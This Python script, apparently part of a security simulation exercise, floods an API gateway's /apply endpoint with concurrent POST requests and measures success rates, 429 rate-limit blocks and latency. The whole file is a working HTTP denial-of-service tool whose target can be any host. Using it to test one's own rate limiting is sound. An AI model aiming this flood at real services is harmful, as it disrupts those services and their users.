"""
THE BREAK - BAS5: DDoS en el borde / API Gateway (Nodo C, Disrupcion y Ocultamiento)

Lanza N hilos concurrentes que envian solicitudes /apply durante T segundos,
simulando una inundacion HTTP contra el gateway, y mide:
  - tasa de exito (2xx)
  - tasa de bloqueo por rate limiting (429)
  - latencia promedio

Uso:
    python ddos_attack.py --target http://localhost:8080 --threads 50 --duration 10
"""
import argparse
import json
import time
import threading
import requests

lock = threading.Lock()
stats = {"total": 0, "success_2xx": 0, "blocked_429": 0, "errors": 0, "latencies": []}


def worker(target, stop_at):
    payload = {"dni": "45678912", "nombre": "Ataque Flood", "monto": 500}
    while time.time() < stop_at:
        start = time.time()
        try:
            resp = requests.post(f"{target}/apply", json=payload, timeout=3)
            latency = (time.time() - start) * 1000
            with lock:
                stats["total"] += 1
                stats["latencies"].append(latency)
                if resp.status_code == 429:
                    stats["blocked_429"] += 1
                elif 200 <= resp.status_code < 300:
                    stats["success_2xx"] += 1
        except Exception:
            with lock:
                stats["total"] += 1
                stats["errors"] += 1


def run(target, n_threads, duration):
    stop_at = time.time() + duration
    threads = [threading.Thread(target=worker, args=(target, stop_at)) for _ in range(n_threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    avg_latency = sum(stats["latencies"]) / len(stats["latencies"]) if stats["latencies"] else 0
    blocked_ratio = stats["blocked_429"] / stats["total"] if stats["total"] else 0

    summary = {
        "attack": "ddos_flood",
        "timestamp": time.time(),
        "target": target,
        "threads": n_threads,
        "duration_sec": duration,
        "total_requests": stats["total"],
        "success_2xx": stats["success_2xx"],
        "blocked_429": stats["blocked_429"],
        "errors": stats["errors"],
        "avg_latency_ms": round(avg_latency, 2),
        "blocked_ratio": round(blocked_ratio, 4),
        # "mitigated" = el rate limiter esta absorbiendo la mayoria del flood
        "mitigated": blocked_ratio > 0.5,
    }
    print(json.dumps(summary, indent=2, ensure_ascii=False))
    return summary


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:8080")
    parser.add_argument("--threads", type=int, default=50)
    parser.add_argument("--duration", type=int, default=10)
    parser.add_argument("--out", default="metrics/ddos_result.json")
    args = parser.parse_args()

    result = run(args.target, args.threads, args.duration)
    try:
        with open(args.out, "w") as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"(no se pudo escribir metrics: {e})")
